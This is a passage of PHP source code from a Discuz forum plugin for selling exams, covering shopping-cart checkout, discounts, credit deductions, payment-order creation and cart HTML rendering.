					echo str_replace(it618_exam_getlang('s1086'),$shopnamestr,it618_exam_getlang('s1089'));it618_exam_delsalework();exit;
				}
			}
			
			$quanid=intval($_GET['quanid'.$shopid]);
			if($quanid>0){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
				$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
				if(it618_union_getisokquan($it618_union_quansale)==''){
					echo 'it618_splitquanit618_split'.$it618_union_lang['s316'];it618_exam_delsalework();exit;
				}
				
				it618_union_setquanmoney($it618_union_quansale);
			}
		}
		
		C::t('#it618_exam#it618_exam_gwcsale')->delete_by_gwcid_uid(0,$uid);
		$tmptime=$_G['timestamp'];$allsummoney=0;
		foreach(C::t('#it618_exam#it618_exam_gwc')->fetch_all_by_uid($uid) as $it618_exam_gwc) {
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($ii1i11i[3]!='1')exit;
			
			$it618_gtypeid=intval($it618_exam_gwc['it618_gtypeid']);
			$it618_tujiid=intval($it618_exam_gwc['it618_tuijid']);
			$it618_count=intval($it618_exam_gwc['it618_count']);
			
			if(!($it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id_state($it618_exam_gwc['it618_pid'],1))){
				echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.it618_exam_getlang('s1090');it618_exam_delsalework();exit;
			}
			
			if(C::t('#it618_exam#it618_exam_goods_type')->counttype_by_pid_ok($it618_exam_gwc['it618_pid'])>0){
				if($it618_gtypeid==0){
					echo it618_exam_getlang('s1136');it618_exam_delsalework();exit;
				}
			}else{
				echo it618_exam_getlang('t2');it618_exam_delsalework();exit;
			}
			
			if($it618_exam_goods['it618_jfbl']>0){
				$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_id($it618_exam_goods['it618_shopid']);
				$creditnum=C::t('#it618_exam#it618_exam_sale')->fetch_extcredits_by_uid($it618_exam['exam_credit'],$it618_exam_shop['it618_uid']);
				if($creditnum=="")$creditnum=0;
		
				if($creditnum<$it618_exam_shop['it618_score']){
					$shopname=$it618_exam_shop['it618_name'];
					$tmpstr=str_replace("{shopname}",$shopname,it618_exam_getlang('s1084'));
					$tmpstr=str_replace("{creditname}",$creditname,$tmpstr);
					echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.$tmpstr;it618_exam_delsalework();exit;
				}
			}
			
			if($it618_gtypeid>0){
				if($it618_exam_goods_type=C::t('#it618_exam#it618_exam_goods_type')->fetch_by_idok($it618_gtypeid)){
					$goods_count=$it618_exam_goods_type['it618_count'];
					$goods_price=$it618_exam_goods_type['it618_saleprice'];
					$goods_jfid=$it618_exam_goods_type['it618_jfid'];
					$goods_score=$it618_exam_goods_type['it618_score'];
				}else{
					echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.it618_exam_getlang('s1137');it618_exam_delsalework();exit;
				}
				
				if($it618_count>$goods_count){
					echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.it618_exam_getlang('s1138');it618_exam_delsalework();exit;
				}
				
				if($it618_exam_goods_type['it618_xgtime']==0){
					$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_exam_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_state=1 and it618_uid=".$uid);
				}else{
					$time=$_G['timestamp']-$it618_exam_goods_type['it618_xgtime']*3600*24;
					
					$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_exam_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_time>$time and it618_state=1 and it618_uid=".$uid);
				}
				if($buycount=='')$buycount=0;
				
				$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
				if($it618_exam_goods_type['it618_xgcount']>0&&$it618_count>$it618_exam_goods_type['it618_xgcount']-$buycount){
					if($it618_exam_goods_type['it618_xgtime']==0){
						echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.it618_exam_getlang('s1139').$it618_exam_goods_type['it618_xgcount'].it618_exam_getlang('s1140').$buycount.it618_exam_getlang('s1141');it618_exam_delsalework();exit;
					}else{
						echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.it618_exam_getlang('s1142').$it618_exam_goods_type['it618_xgtime'].it618_exam_getlang('s1143').$it618_exam_goods_type['it618_xgcount'].it618_exam_getlang('s1140').$buycount.it618_exam_getlang('s1141');it618_exam_delsalework();exit;
					}
				}
			}else{
				$goods_count=$it618_exam_goods['it618_count'];
				$goods_price=$it618_exam_goods['it618_saleprice'];
				$goods_jfid=$it618_exam_goods['it618_jfid'];
				$goods_score=$it618_exam_goods['it618_score'];
			}
			
			if($it618_exam_goods['it618_xgtype']==1){
				
				$timetmp1=explode(" ",$it618_exam_goods['it618_xgtime1']);
				$timetmp2=explode(" ",$it618_exam_goods['it618_xgtime2']);
				$timetmp11=explode("-",$timetmp1[0]);
				$timetmp12=explode(":",$timetmp1[1]);
				$timetmp21=explode("-",$timetmp2[0]);
				$timetmp22=explode(":",$timetmp2[1]);
				
				
				$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
				$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
				
				if($etime<$_G['timestamp']){
					echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.$it618_exam_lang['s1055'];it618_exam_delsalework();exit;
				}else{
					if($btime>$_G['timestamp']){
						echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.$it618_exam_lang['s1056'];it618_exam_delsalework();exit;
					}
				}
			}
			
			if($it618_exam_goods['it618_xgtype']==2){
				$timetmp1=explode(" ",$it618_exam_goods['it618_xgtime1']);
				$timetmp2=explode(" ",$it618_exam_goods['it618_xgtime2']);
				$timetmp11=explode("-",$timetmp1[0]);
				$timetmp12=explode(":",$timetmp1[1]);
				$timetmp21=explode("-",$timetmp2[0]);
				$timetmp22=explode(":",$timetmp2[1]);
				
				$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
				$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
				
				if($etime<$_G['timestamp']){
					echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.$it618_exam_lang['s1055'];it618_exam_delsalework();exit;
					
				}else{
					if($btime>$_G['timestamp']){
						echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.$it618_exam_lang['s1056'];it618_exam_delsalework();exit;
					}else{
						$btimecur=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j'), date('Y'));
						$btimecur1=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j')+1, date('Y'));
						$etimecur=mktime($timetmp22[0], $timetmp22[1], 0, date('n'), date('j'), date('Y'));
						
						if($btimecur>$_G['timestamp']){
							echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.$it618_exam_lang['s1056'];it618_exam_delsalework();exit;
						}
						
						if($etimecur<$_G['timestamp']){
							echo 'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.$it618_exam_lang['s1056'];it618_exam_delsalework();exit;
						}
					}
				}
			}

			if($goods_score>0){
				if(C::t('#it618_exam#it618_exam_jfhl')->count_by_jfid_isok($goods_jfid)==0){
					echo  'it618_splitgidit618_split'.$it618_exam_gwc['id'].'it618_split'.it618_exam_getlang('s1108');it618_exam_delsalework();exit;
				}
			}
			
			if($IsGroup==1){
				$vipzk=it618_exam_getvipzk($it618_exam_gwc['it618_pid']);
			}
			
			if($vipzk>0){
				$goods_price=$goods_price*$vipzk/100;
				$goods_score=intval($goods_score*$vipzk/100);
			}
			
			if($it618_exam_gwc['it618_price']>0){
				$goods_price=$it618_exam_gwc['it618_price'];
			}
			
			if($it618_exam_gwc['it618_pricescore']>0){
				$goods_score=$it618_exam_gwc['it618_pricescore'];
			}
			
			$summoney=$goods_price*$it618_count-$it618_exam_gwc['it618_quanmoney'];
			
			$allsummoney=$allsummoney+$summoney;
			
			if($goods_score>0){
				$allsumscore[$goods_jfid]+=$goods_score*$it618_count;
			}
	
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			
			$id = C::t('#it618_exam#it618_exam_gwcsale')->insert(array(
				'it618_gwcid' => 0,
				'it618_uid' => $uid,
				'it618_shopid' => $it618_exam_gwc['it618_shopid'],
				'it618_pid' => $it618_exam_gwc['it618_pid'],
				'it618_gtypeid' => $it618_gtypeid,
				'it618_tuijid' => $it618_tuijid,
				'it618_count' => $it618_count,
				'it618_price' => $goods_price,
				'it618_jfid' => $goods_jfid,
				'it618_score' => $goods_score,
				'it618_quanmoney' => $it618_exam_gwc['it618_quanmoney'],
				'it618_vipzk' => $vipzk,
				'it618_sfmoney' => $summoney,
				'it618_sfscore' => $goods_score*$it618_count,
				'it618_tel' => it618_exam_utftogbk($_GET["it618_tel"]),
				'it618_jfbl' => $it618_exam_goods['it618_jfbl'],
				'it618_time' => $tmptime
			), true);

		}
		
		for($i=1;$i<=8;$i++){
			if($allsumscore[$i]>0){
				$jfname=$_G['setting']['extcredits'][$i]['title'];
				
				$creditnum=DB::result_first("select extcredits".$i." from ".DB::table('common_member_count')." where uid=".$_G['uid']);
				if($creditnum<$allsumscore[$i]){
					echo it618_exam_getlang('s1121').$creditnum.$jfname.it618_exam_getlang('s1122');it618_exam_delsalework();exit;
				}
				$gwcscorestr.=$allsumscore[$i].$jfname.' ';
			}
		}
		
		$gwcid = C::t('#it618_exam#it618_exam_gwcsale_main')->insert(array(
			'it618_uid' => $uid,
			'it618_state' => 0,
			'it618_time' => $tmptime
		), true);
			
		C::t('#it618_exam#it618_exam_gwcsale')->update_gwcid_by_uid($gwcid,$uid);
		
		if($allsummoney==0){
			for($i=1;$i<=8;$i++){
				if($allsumscore[$i]>0){
					C::t('common_member_count')->increase($uid, array(
						'extcredits'.$i => (0-$allsumscore[$i]))
					);
				}
			}
			
			C::t('#it618_exam#it618_exam_gwcsale_main')->update($gwcid,array(
				'it618_moneybz' => $gwcscorestr,
				'it618_state' => 1
			));
			
			foreach(C::t('#it618_exam#it618_exam_gwcsale')->fetch_all_by_gwcid($gwcid) as $it618_exam_gwcsale) {
						
				$id = C::t('#it618_exam#it618_exam_sale')->insert(array(
					'it618_gwcid' => $it618_exam_gwcsale['it618_gwcid'],
					'it618_shopid' => $it618_exam_gwcsale['it618_shopid'],
					'it618_uid' => $it618_exam_gwcsale['it618_uid'],
					'it618_pid' => $it618_exam_gwcsale['it618_pid'],
					'it618_gtypeid' => $it618_exam_gwcsale['it618_gtypeid'],
					'it618_tuijid' => $it618_exam_gwcsale['it618_tuijid'],
					'it618_price' => $it618_exam_gwcsale['it618_price'],
					'it618_jfid' => $it618_exam_gwcsale['it618_jfid'],
					'it618_score' => $it618_exam_gwcsale['it618_score'],
					'it618_count' => $it618_exam_gwcsale['it618_count'],
					'it618_quanmoney' => $it618_exam_gwcsale['it618_quanmoney'],
					'it618_vipzk' => $it618_exam_gwcsale['it618_vipzk'],
					'it618_sfmoney' => $it618_exam_gwcsale['it618_sfmoney'],
					'it618_sfscore' => $it618_exam_gwcsale['it618_sfscore'],
					'it618_jfbl' => $it618_exam_gwcsale['it618_jfbl'],
					'it618_tel' => $it618_exam_gwcsale['it618_tel'],
					'it618_state' => 1,
					'it618_time' => $it618_exam_gwcsale['it618_time']
				), true);
				
				if($it618_exam_gwcsale['it618_tuijid']>0){
					require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
					Union_TuiTC_Add($it618_exam_gwcsale['it618_tuijid'],$id);
				}
				
				$it618_exam_sale=C::t('#it618_exam#it618_exam_sale')->fetch_by_id($id);
				it618_exam_updategoodscount($it618_exam_sale);
				it618_exam_qrxf($id);

				if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			}
			
			$it618_exam_gwcsale_main = C::t('#it618_exam#it618_exam_gwcsale_main')->fetch_by_id($gwcid);
			
			C::t('#it618_exam#it618_exam_gwcsale')->delete_by_uid($it618_exam_gwcsale_main['it618_uid']);
			C::t('#it618_exam#it618_exam_gwc')->delete_by_uid($it618_exam_gwcsale_main['it618_uid']);

			it618_exam_sendmessage('gwc_user',$it618_exam_gwcsale_main['id']);
			foreach(C::t('#it618_exam#it618_exam_sale')->fetch_all_shopid_by_gwcid($it618_exam_gwcsale_main['id']) as $shopids) {
				it618_exam_sendmessage('gwc_shop',$it618_exam_gwcsale_main['id'],$shopids['it618_shopid']);
			}
			it618_exam_sendmessage('gwc_admin',$it618_exam_gwcsale_main['id']);
			
			echo 'it618_splitjfokit618_split';it618_exam_delsalework();exit;
		}else{
			if($_GET['paytype']==""){
				echo it618_exam_getlang('s1069');it618_exam_delsalework();exit;
			}	
		}
		
		C::t('#it618_exam#it618_exam_gwcsale_main')->update($gwcid,array(
			'it618_moneybz' => $allsummoney.it618_exam_getlang('s125').' '.$gwcscorestr
		));
		
		foreach(C::t('#it618_exam#it618_exam_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$quanid=intval($_GET['quanid'.$shopids['it618_shopid']]);
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_gwcid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
			}
		}
		
		for($i=1;$i<=8;$i++){
			if($allsumscore[$i]>0){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$i => (0-$allsumscore[$i]))
				);
			}
		}
		
		$saletype='0502';
		$saleid=$gwcid;
		$out_trade_no = date("YmdHis").$saletype.$saleid;
		
		$body=str_replace("money",$allsummoney,$it618_exam_lang['s1098']);
		$body=str_replace("gwcid",$gwcid,$body);
		
		$total_fee=$allsummoney;
		
		if(exam_is_mobile()){ 
			$wap=1;
			$url=$_G['siteurl'].it618_exam_getrewrite('exam_wap','uc@'.$uid,'plugin.php?id=it618_exam:wap&pagetype=uc');
		}else{
			$wap=0;
			$url=$_G['siteurl'].it618_exam_getrewrite('exam_gwcmysale','','plugin.php?id=it618_exam:gwc&mysale');
		}
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
		$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
		$tmparr=explode("it618_split",$domainurl_paytype);
		$domainurl=$tmparr[0];
		$paytype=$tmparr[1];

		C::t('#it618_credits#it618_credits_salepay')->insert(array(
			'it618_out_trade_no' => $out_trade_no,
			'it618_uid' => $uid,
			'it618_saletype' => $saletype,
			'it618_saleid' => $saleid,
			'it618_paytype' => $paytype,
			'it618_url' => $url,
			'it618_body' => $body,
			'it618_total_fee' => round($total_fee,2),
			'it618_plugin' => 'it618_exam',
			'it618_wap' => $wap,
			'it618_state' => 0,
			'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
			'it618_time' => $_G['timestamp']
		), true);
	
		$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
		
		echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_exam_delsalework();
	}
	exit;
}


if($_GET['ac']=="getgwc"){
	if($uid>0){
		$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid_pid($uid,$_GET['pid']);
		if($count>0){
			echo '2';
		}else{
			$pid=intval($_GET['pid']);
			if($IsGroup==1){
				$salepower=it618_exam_groupsalepower($pid);
				if($salepower==1){
					echo it618_exam_getlang('s1554');exit;
				}
				if($salepower==2){
					echo it618_exam_getlang('s1555');exit;
				}
			}
		
			$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($pid);
			
			if($IsUnion==1&&$_GET['tuijcode']!=''){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
				$it618_tuijid=Union_IsTuiJoin('exam',$pid,$_GET['tuijcode']);
			}
			
			C::t('#it618_exam#it618_exam_gwc')->insert(array(
				'it618_uid' => $uid,
				'it618_pid' => $pid,
				'it618_shopid' => $it618_exam_goods['it618_shopid'],
				'it618_gtypeid' => $_GET['gtypeid'],
				'it618_tuijid' => $it618_tuijid,
				'it618_count' => $_GET['it618_count']
			), true);
			
			$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid($uid);
			echo '1it618_split'.$count;
		}
	}else{
		echo $it618_exam_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="gwclist_get"){
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid($uid);
	$funname='getgwclist';
	
	$allsummoney=0;
	foreach(C::t('#it618_exam#it618_exam_gwc')->fetch_all_by_uid($uid) as $it618_exam_gwc) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_gwc['it618_pid']);
		$it618_exam_shop = C::t('#it618_exam#it618_exam_shop')->fetch_by_id($it618_exam_goods['it618_shopid']);
		
		$it618_count=$it618_exam_gwc['it618_count'];
		
		$gtypename='';
		if($it618_exam_gwc['it618_gtypeid']>0){
			$gtypename = C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_gwc['it618_gtypeid']);
			$gtypename = '<font color="#999">'.$it618_exam_lang['s1131'].': </font><font color=red><b>'.$gtypename.'</b></font>';
			
			$it618_exam_goods_type = C::t('#it618_exam#it618_exam_goods_type')->fetch_by_id($it618_exam_gwc['it618_gtypeid']);
			$it618_saleprice=$it618_exam_goods_type['it618_saleprice'];
			$it618_salescore=$it618_exam_goods_type['it618_score'];
			$it618_salejfid=$it618_exam_goods_type['it618_jfid'];
			$days=$it618_exam_goods_type['it618_time'];
		}else{
			$it618_saleprice=$it618_exam_goods['it618_saleprice'];
			$it618_salescore=$it618_exam_goods['it618_score'];
			$it618_salejfid=$it618_exam_goods['it618_jfid'];
			$days=0;
		}
		
		if($it618_saleprice>0&&$it618_salescore>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
			$goodsmoneystr='&yen;{price} + {score} '.$goodsjfname;
		}else{
			if($it618_saleprice>=0){
				$goodsmoneystr='&yen;{price}';
			}
			
			if($it618_salescore>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
				$goodsmoneystr='{score} '.$goodsjfname;
			}
		}
		
		if($it618_exam_gwc['it618_iseditprice']==1){
			$it618_saleprice=$it618_exam_gwc['it618_price'];
			
			$it618_salescore=$it618_exam_gwc['it618_pricescore'];
		}
		
		if($IsGroup==1){
			$vipzk=it618_exam_getvipzk($it618_exam_gwc['it618_pid']);
		}
		
		if($vipzk>0){
			$goodsmoneystr=str_replace("{price}",round($it618_saleprice*$it618_count*$vipzk/100,2),$goodsmoneystr);
			$goodsmoneystr=str_replace("{score}",intval($it618_salescore*$it618_count*$vipzk/100),$goodsmoneystr);
		}else{
			$goodsmoneystr=str_replace("{price}",round($it618_saleprice*$it618_count,2),$goodsmoneystr);
			$goodsmoneystr=str_replace("{score}",($it618_salescore*$it618_count),$goodsmoneystr);
		}
		
		$goodsmoneystr='<font color="#FF7E00">'.$goodsmoneystr.'</font> ';
		
		if($vipzk>0){
			$summoney=round($it618_saleprice*$it618_count*$vipzk/100,2);
		}else{
			$summoney=round($it618_saleprice*$it618_count,2);
		}
		
		DB::query("UPDATE ".DB::table("it618_exam_gwc")." SET it618_money=".$summoney." WHERE id=".$it618_exam_gwc['id']);
		
		$allsummoney=$allsummoney+$summoney;
		
		if($it618_salescore>0){
			if($vipzk>0){
				$it618_salescore=intval($it618_salescore*$it618_count*$vipzk/100);
			}
			$allsumscore[$it618_salejfid]+=$it618_salescore*$it618_count;
		}
		
		$jfblstr='';
		if($it618_exam_goods['it618_jfbl']>0){
			$zsmoney=intval($it618_exam_goods['it618_jfbl']*$summoney/100);
			if($zsmoney>=1){
				$jfblstr='<font color=#888>'.$it618_exam_lang['s1110'].'<font color=red>'.intval($it618_exam_goods['it618_jfbl']*$summoney/100).'</font>'.$creditname.'</font>';
				$allzsmoney=$allzsmoney+$zsmoney;
			}
		}
		
		if($days==0){
			if($_GET['ac1']=='pcgwc'){
				$tmpcountstr='<span style="line-height:28px">1</span>';
			}else{
				
			}
		}else{
			$disabled='';
			$onclickstr='onclick="gwcminus('.$it618_exam_gwc['id'].')"';
			if($it618_exam_gwc['it618_count']==1){
				$disabled='disabled';
				$onclickstr='';
			}
			$tmpcountstr='<span class="minus '.$disabled.'" '.$onclickstr.'><i class="minus-icon"></i></span>
							<input type="text" value="'.$it618_exam_gwc['it618_count'].'" readonly="readonly" />
							<span class="plus" onclick="gwcplus('.$it618_exam_gwc['id'].')"><i class="plus-icon"></i></span>';
		}
		
		if($vipzk>0){
			$zk=round(($vipzk/10),2);
			$zkstr=$zk.$it618_exam_lang['s1952'];
			
			if($_GET['ac1']=='pcgwc'){
				$zkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px;color:#888">'.$zkstr.'</span><br>';
			}else{
				$zkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px;color:#888">'.$zkstr.'</span> ';
			}
		}

		if($_GET['ac1']=='pcgwc'){
			$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);

			$goodslist.='<div  id="gwcpid'.$it618_exam_gwc['id'].'" class="cart-list cl">
							<div class="product">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="95" height="60"/></a>
							<div class="product-info">
							<p><a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'">'.$it618_exam_goods['it618_name'].'</a></p>
							<p>'.$it618_exam_shop['it618_name'].' '.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</p>
							<p>'.$gtypename.' '.$jfblstr.'</p>
							</div>
							</div>
							<div class="money">
							<p>'.$zkstr.$goodsmoneystr.'</p>
							</div>
							<div class="quantity">
							<div class="quantity-number">
							'.$tmpcountstr.'
							</div>
							</div>
							<div class="operate">
							<p><a href="javascript:" onclick="delgwc('.$it618_exam_gwc['id'].')">'.$it618_exam_lang['s884'].'</a></p>
							</div>
						</div>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			
			$goodslist.='<tr id="gwcpid'.$it618_exam_gwc['id'].'" class="cart-list cl"><td><table width="100%">
							<tr class="gwclisttr1"><td width="113" style="padding-left:3px">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="108" height="65"/></a>
							</td><td colspan="3">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'" style="font-size:13px;color:#333">'.$it618_exam_goods['it618_name'].'</a><br>
							<font color=#666>'.$it618_exam_shop['it618_name'].'</font><br>
							<p>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'<br>'.$gtypename.' '.$jfblstr.'</p>
							</td></tr>
							<tr class="gwclisttr2"><td>
							</td><td style="padding-top:3px">
							<div class="quantity-number">
							'.$tmpcountstr.'
							</div>
							</td><td align="right" style="padding-top:3px; padding-right:6px" colspan="3">
							<b><font color="#FF9900">'.$zkstr.$goodsmoneystr.'</font></b> <a href="javascript:" onclick="delgwc('.$it618_exam_gwc['id'].')">'.$it618_exam_lang['s884'].'</a></td></tr>
						</table></td></tr>';
			
		}

	}
	
	if($it618_exam['exam_saletel']==2){
		$isbd='telbd';
		if($it618_members_user=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_user')." WHERE it618_uid=".$_G['uid'])){
			$tel=$it618_members_user['it618_tel'];
			$isbd='ok';
		}
	}else{
		$tel=C::t('#it618_exam#it618_exam_sale')->fetch_tel_by_uid($_G['uid']);
	}
	
	$userstr=it618_exam_getusername($_G['uid']).'('.$_G['uid'].')';
	if($_GET['ac1']=='pcgwc'){
		$titlestr=$it618_exam_lang['s1076'];
		$tmpstr='<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:130px;height:26px;border:#e8e8e8 1px solid;color:green;padding-left:3px;font-weight:bold" value="'.$tel.'" /> <font color="#999">'.$it618_exam_lang['t215'].'</font>';
		
		$addrstr='<div class="buy-block-title"><span style="float:right;color:#999;">'.$userstr.'</span><h3>'.$titlestr.'</h3></div><div style="padding:10px;padding-right:0;line-height:35px">'.$tmpstr.'</div>';
	}
	
	if($_GET['ac1']=='wapgwc'){
		$titlestr=$it618_exam_lang['s1076'];
		$tmpstr='<tr><td style="padding:3px">
				<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:150px;height:33px;border:#f1f1f1 1px solid;color:#390;font-size:18px;padding-left:3px;\margin-bottom:3px" value="'.$tel.'" /> <font color="#999">'.$it618_exam_lang['t215'].'</font>
				</td></tr>';
		
		$addrstr='<tr><td><table width="100%">
				<tr class="gwctrtitle">
				<th style="padding-left:3px"><span style="float:right;color:#999;font-weight:normal;margin-right:3px">'.$userstr.'</span>'.$titlestr.'</th>
				</tr>
				</table></td></tr>'.$tmpstr;
	}
	
	if($allzsmoney>0){
		$jfmoenystr.=$it618_exam_lang['s1113'].'<font color=red>'.$allzsmoney.'</font>'.$creditname;
	}
	
	for($i=1;$i<=8;$i++){
		if($allsumscore[$i]>0){
			$jfname=$_G['setting']['extcredits'][$i]['title'];
			$scorestr.=$allsumscore[$i].$jfname.'+';
			
			$creditnum=C::t('#it618_exam#it618_exam_sale')->fetch_extcredits_by_uid($i,$_G['uid']);
			if($creditnum=="")$creditnum=0;
			$jfcounttmp.='<font color="red">'.$creditnum.'</font>'.$jfname;
		}
	}
	
	if($scorestr!=''){
		$scorestr.='@';
		$scorestr=str_replace("+@","",$scorestr);
		
		$jfcountstr=$it618_exam_lang['s1107'].' '.$jfcounttmp;
	}
	
	$tmpsumscore='<input type="hidden" id="tmpsumscore" value="">';
	if($allsummoney>0&&$scorestr!=''){
		$summoneystr='&yen;'.$allsummoney.'+'.$scorestr;
		$tmpsumscore='<input type="hidden" id="tmpsumscore" value="+'.$scorestr.'">';
	}else{
		if($allsummoney>0){
			$summoneystr='&yen;'.$allsummoney;
		}
		if($scorestr!=''){
			$summoneystr=$scorestr;
		}
	}
	
	if($IsUnion==1){
		require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
		if($_GET['ac1']=='pcgwc')$wap=0;else $wap=1;
		$quanstr=it618_union_getquangwc('exam',$wap,$_GET['width']);
	}else{
		$quanstr='<input type="hidden" id="shopids" value="">it618_split0';
	}
	
	if($_GET['ac1']=='pcgwc'){
		if($goodslist=='')$goodslist='<div style="padding:6px;color:#888">'.$it618_exam_lang['s1361'].'</div>';
		echo $goodslist.'<div class="total-price"><span style="float:left">'.$jfcountstr.'</span><a href="javascript:" onclick="cleargwc()" style="line-height:32px">'.$it618_exam_lang['s1114'].'</a> <span>'.$it618_exam_lang['s1074'].'</span><b>'.$summoneystr.'</b><span style="float:left">'.$jfmoenystr.'</span>'.$tmpsumscore.'</div>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$allsummoney.'it618_split'.$isbd.'it618_split'.$quanstr;
	}else{
		if($goodslist=='')$goodslist='<tr><td style="padding:6px;color:#888">'.$it618_exam_lang['s1361'].'</td></tr>';
		echo $goodslist.'<tr><td align="right" style="padding:6px;padding-top:10px;padding-right:10px"><span style="float:left">'.$jfcountstr.'</span><a href="javascript:" onclick="cleargwc()">'.$it618_exam_lang['s1114'].'</a></td></tr><tr><td align="right" style="padding:6px;padding-right:10px;padding-bottom:0;line-height:15px;color:#999">'.$jfmoenystr.'</td></tr><tr><td align="right" style="padding:10px">'.$it618_exam_lang['s1074'].' <b><font color="#FF6600" style="font-size:18px">'.$summoneystr.'</font></b>'.$tmpsumscore.'</td></tr>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$allsummoney.'it618_split'.$isbd.'it618_split'.$quanstr;
	}
	exit;
}


if($_GET['ac']=="gwcminus"){
	if($uid>0){
		C::t('#it618_exam#it618_exam_gwc')->update_count1_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
